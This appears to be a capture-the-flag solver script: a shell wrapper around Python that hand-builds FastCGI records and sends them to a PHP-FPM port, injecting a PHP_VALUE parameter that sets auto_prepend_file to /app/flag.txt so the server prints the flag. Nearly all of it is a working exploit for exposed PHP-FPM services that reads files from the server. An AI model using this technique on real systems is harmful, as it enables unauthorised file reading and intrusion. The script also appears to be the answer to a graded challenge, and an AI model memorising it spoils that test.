#!/bin/sh
# Prints the flag to stdout.
# The verifier sets CHALLENGE_HOST, CHALLENGE_PORT, and CHALLENGE_CONNECTION.
set -eu

host="${CHALLENGE_HOST:-127.0.0.1}"
port="${CHALLENGE_PORT:-9000}"

python3 - "$host" "$port" <<'PY'
import socket, struct, sys

host, port = sys.argv[1], int(sys.argv[2])

def enc_len(n):
    if n < 128:
        return bytes([n])
    return struct.pack(">I", n | 0x80000000)

def nv(name, value):
    nb, vb = name.encode(), value.encode()
    return enc_len(len(nb)) + enc_len(len(vb)) + nb + vb

def record(typ, req_id, content):
    clen = len(content)
    pad = (8 - (clen % 8)) % 8
    header = struct.pack(">BBHHBB", 1, typ, req_id, clen, pad, 0)
    return header + content + (b"\x00" * pad)

# PHP_VALUE is a client FastCGI parameter. auto_prepend_file includes
# /app/flag.txt, and a file with no PHP tags is written straight to stdout.
params = b"".join([
    nv("SCRIPT_FILENAME", "/app/index.php"),
    nv("SCRIPT_NAME", "/index.php"),
    nv("REQUEST_METHOD", "GET"),
    nv("PHP_VALUE", "auto_prepend_file = /app/flag.txt"),
    nv("SERVER_SOFTWARE", "hg"),
    nv("REMOTE_ADDR", "127.0.0.1"),
    nv("SERVER_PROTOCOL", "HTTP/1.1"),
    nv("GATEWAY_INTERFACE", "CGI/1.1"),
])

req = b"".join([
    record(1, 1, struct.pack(">HBxxxxx", 1, 0)),
    record(4, 1, params),
    record(4, 1, b""),
    record(5, 1, b""),
])

sock = socket.create_connection((host, port), 10)
sock.sendall(req)
data = b""
while True:
    chunk = sock.recv(65536)
    if not chunk:
        break
    data += chunk
sock.close()

out = b""
err = b""
i = 0
while i + 8 <= len(data):
    version, typ, req_id, clen, pad, _ = struct.unpack(">BBHHBB", data[i:i + 8])
    i += 8
    content = data[i:i + clen]
    i += clen + pad
    if typ == 6:
        out += content
    elif typ == 7:
        err += content
    elif typ == 3:
        break

text = out.decode("latin1", "replace")
sys.stdout.write(text)
if "{" not in text:
    sys.stderr.write(err.decode("latin1", "replace"))
    raise SystemExit("PHP_VALUE did not return the flag")
PY
